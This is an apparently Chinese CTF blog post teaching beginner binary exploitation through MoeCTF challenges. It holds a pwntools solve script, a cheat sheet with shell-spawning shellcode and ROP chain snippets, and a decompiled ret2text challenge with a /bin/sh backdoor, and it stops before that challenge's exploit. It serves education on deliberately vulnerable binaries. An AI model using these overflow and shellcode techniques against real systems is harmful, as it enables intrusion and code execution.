<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Wang1r">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/09/09/全栈之旅：从moectf开始的pwn入门指南/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="Week1二进制漏洞审计入门指北执行解题脚本即可 1234567891011121314151617from pwn import *                                    # 导入 pwntools。context(arch&#x3D;&#x27;amd64&#x27;, os&#x3D;&#x27;linux&#x27;, log_level&#x3D;&#x27;debug&#x27;)">
<meta property="og:type" content="article">
<meta property="og:title" content="全栈之旅：从moectf开始的pwn入门指南">
<meta property="og:url" content="http://example.com/2025/09/09/%E5%85%A8%E6%A0%88%E4%B9%8B%E6%97%85%EF%BC%9A%E4%BB%8Emoectf%E5%BC%80%E5%A7%8B%E7%9A%84pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/index.html">
<meta property="og:site_name" content="Wang1r的博客">
<meta property="og:description" content="Week1二进制漏洞审计入门指北执行解题脚本即可 1234567891011121314151617from pwn import *                                    # 导入 pwntools。context(arch&#x3D;&#x27;amd64&#x27;, os&#x3D;&#x27;linux&#x27;, log_level&#x3D;&#x27;debug&#x27;)">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-09-09T13:57:11.000Z">
<meta property="article:modified_time" content="2025-10-07T12:18:12.437Z">
<meta property="article:author" content="Wang1rrr">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/example.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/example.png">
    <meta name="theme-color" content="#FFD700">
    <link rel="shortcut icon" href="/images/example.png">
    <!--- Page Info-->
    
    <title>
        
            全栈之旅：从moectf开始的pwn入门指南 | Wang1rrr&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
        <link href="" rel="stylesheet">
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFD700","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/690195.jpg","dark":"/images/690195.jpg"},"title":"想要成为特别的人","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#000","dark":"#d1d1b6"},"text_style":{"title_size":"3.2rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"YouYuan","url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Wang1rrr","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"About":{"icon":"fa-regular fa-user","path":"/about/"},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/1 12:00:00"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Wang1rrr&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about/"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/links/"
                                        >
                                    <i class="fa-solid fa-link fa-fw"></i>
                                    友情链接
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about/"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/links/"
                        >
                            <span>
                                友情链接
                            </span>
                            
                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">全栈之旅：从moectf开始的pwn入门指南</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/example.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Wang1r</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-09-09 21:57:11</span>
        <span class="mobile">2025-09-09 21:57:11</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-07 20:18:12</span>
            <span class="mobile">2025-10-07 20:18:12</span>
            <span class="hover-info">更新</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTF/">CTF</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/WP/">WP</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="二进制漏洞审计入门指北"><a href="#二进制漏洞审计入门指北" class="headerlink" title="二进制漏洞审计入门指北"></a>二进制漏洞审计入门指北</h2><p>执行解题脚本即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)             # 在本地运行程序。</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                    # 启动 GDB</span></span><br><span class="line">io = connect(???, ???)              <span class="comment"># 与在线环境交互。</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;114511&#x27;</span>)              <span class="comment"># 什么时候用 send 什么时候用 sendline？</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)          <span class="comment"># p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？</span></span><br><span class="line">                                    <span class="comment"># 你看懂原程序这里的检查逻辑了吗？</span></span><br><span class="line">payload += <span class="string">b&#x27;shuijiangui&#x27;</span>           <span class="comment"># strcmp</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password.&#x27;</span>, payload) <span class="comment"># 发送！通过所有的检查。</span></span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br></pre></td></tr></table></figure></div>

<h3 id="what-is-pwntools"><a href="#what-is-pwntools" class="headerlink" title="what is pwntools"></a>what is pwntools</h3><p>pwntools 是一个专为<strong>二进制安全研究</strong>（尤其是漏洞利用开发）设计的 Python 工具库，广泛应用于 CTF 竞赛、渗透测试和漏洞分析领域。它通过封装底层操作（如进程交互、汇编指令生成、内存操作等），提供了一套高效且统一的 API，大幅简化了漏洞利用脚本（Exploit）的开发流程</p>
<h3 id="how-to-use-pwntools"><a href="#how-to-use-pwntools" class="headerlink" title="how to use pwntools"></a>how to use pwntools</h3><p>以下是一些常用的用法：</p>
<ul>
<li><strong>本地进程</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./binary&quot;</span>)      <span class="comment"># 启动本地程序</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>远程连接</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">1337</span>)  <span class="comment"># 连接远程服务[1,2](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>发送数据</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&quot;data&quot;</span>)              <span class="comment"># 原始数据</span></span><br><span class="line">p.sendline(<span class="string">b&quot;data&quot;</span>)          <span class="comment"># 数据+换行符</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Prompt:&quot;</span>, <span class="string">b&quot;input&quot;</span>)  <span class="comment"># 匹配提示后发送[3,4](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>接收数据</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = p.recv(<span class="number">1024</span>)         <span class="comment"># 接收指定字节</span></span><br><span class="line">line = p.recvline()          <span class="comment"># 接收一行</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;End:&quot;</span>)         <span class="comment"># 接收直到匹配字符串[1,5](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>交互模式</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.interactive()  <span class="comment"># 接管控制台（获取shell后常用）[1,2](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>ELF文件解析</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]    <span class="comment"># 函数地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]         <span class="comment"># PLT表地址</span></span><br><span class="line">got_addr = elf.got[<span class="string">&quot;printf&quot;</span>]       <span class="comment"># GOT表地址[1,4](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>Shellcode生成</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成Linux/x86的execve(&quot;/bin/sh&quot;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())    </span><br><span class="line"><span class="comment"># 避免坏字符（如\x00）</span></span><br><span class="line">shellcode = asm(shellcraft.sh().replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>))[<span class="number">1</span>,<span class="number">5</span>](@ref)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>ROP链构造</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(elf)</span><br><span class="line">rop.call(<span class="string">&quot;puts&quot;</span>, [elf.got[<span class="string">&quot;puts&quot;</span>]])  <span class="comment"># 调用puts(puts@got)</span></span><br><span class="line">rop.call(<span class="string">&quot;main&quot;</span>)                     <span class="comment"># 返回到main函数</span></span><br><span class="line">payload = flat(&#123;<span class="number">64</span>: rop.chain()&#125;)    <span class="comment"># 填充偏移后拼接ROP链[1,4](@ref)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>数据打包与解包</strong></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p64(<span class="number">0xdeadbeef</span>)    <span class="comment"># 打包为64位小端序字节：b&#x27;\xef\xbe\xad\xde&#x27;</span></span><br><span class="line">u32(<span class="string">b&quot;ABCD&quot;</span>)       <span class="comment"># 解包为32位整数：0x44434241[2,4](@ref)</span></span><br></pre></td></tr></table></figure></div>

<h3 id="脚本解析"><a href="#脚本解析" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">arch设置为amd64，这是最常用的arch版本</span></span><br><span class="line"><span class="string">如果是32位系统，一般使用i386</span></span><br><span class="line"><span class="string">64位系统中还有arm64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">os选用linux，一般的pwn题都是elf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">log_level使用debug，可以显示更多运行信息</span></span><br><span class="line"><span class="string">如果不想输出过多内容，可以使用info或者error模式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)  				<span class="comment"># 在本地运行程序。</span></span><br><span class="line">io = connect(???, ???)              <span class="comment"># 与在线环境交互。</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;114511&#x27;</span>)              </span><br><span class="line"><span class="comment"># sendline相对于send会多发送换行符</span></span><br><span class="line"><span class="comment">#程序若用 gets() 或 fgets() 读输入，通常需要 \n 触发读取。</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)          </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？</span></span><br><span class="line"><span class="string">p32(0xdeadbeef)是通过pwntools打包好的字节信息，可以转换成b&quot;\xef\xbe\xad\xde&quot;，也即小端序字节码</span></span><br><span class="line"><span class="string">b&quot;\xde\xad\xbe\xef&quot;则是大端序的0xdeadbeef，常见的系统一般都是小端序</span></span><br><span class="line"><span class="string">b&quot;deadbeef&quot;则是发送ASCII码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += <span class="string">b&#x27;shuijiangui&#x27;</span>         </span><br><span class="line">io.sendafter(<span class="string">b&#x27;password.&#x27;</span>, payload) </span><br><span class="line"><span class="comment">#sendafter 严格匹配字节序列 b&#x27;password.&#x27;。若程序输出有空格/换行（如 &quot;password: &quot;），需完整匹配。</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()                    <span class="comment"># 开启互动模式</span></span><br></pre></td></tr></table></figure></div>

<h2 id="EZtext"><a href="#EZtext" class="headerlink" title="EZtext"></a>EZtext</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Stack overflow is a powerful art!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In this MoeCTF,I will show you the charm of PWN!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You need to know the struct of stack first.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Then how many bytes do you need to overflow the stack?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    overflow(v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">overflow</span><span class="params">(<span class="type">int</span> n7)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( n7 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Come on, you can&#x27;t even fill this array!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, n7);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK,I recvieve your byte.and then?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">treasure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You got the secret!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>checksec检查：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./pwn</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   44 Symbols        No    0               1               ./pwn</span><br></pre></td></tr></table></figure></div>

<p>从源码可以看到，这是很明显的ret2text的题型</p>
<h3 id="what-is-ret2text？"><a href="#what-is-ret2text？" class="headerlink" title="what is ret2text？"></a>what is ret2text？</h3><p>ret2text是栈溢出类型中最简单的一类问题，我们通过覆盖栈中内容来进行一系列调用。</p>
<p>ret2text就是执行程序中已有的代码，例如程序中写有system等系统的调用函数。</p>
<p>在本题中就是后门函数treasure()</p>
<h3 id="what-is-stack-stack-buffer-overflow？"><a href="#what-is-stack-stack-buffer-overflow？" class="headerlink" title="what is stack stack buffer overflow？"></a>what is stack stack buffer overflow？</h3><p><strong>栈缓冲区溢出</strong>（stack buffer overflow或stack buffer overrun）是计算机程序把数据写入调用栈上的内存时超出了数据结构的边界。栈缓冲区溢出是缓冲区溢出的一种。 这会损坏相邻数据的值，引发程序崩溃或者修改了函数返回地址从而导致执行恶意的程序。这种攻击方式称为<strong>stack smashing</strong>。可被用于注入可执行代码、接管进程的执行。是最为古老的黑客攻击行为之一。</p>
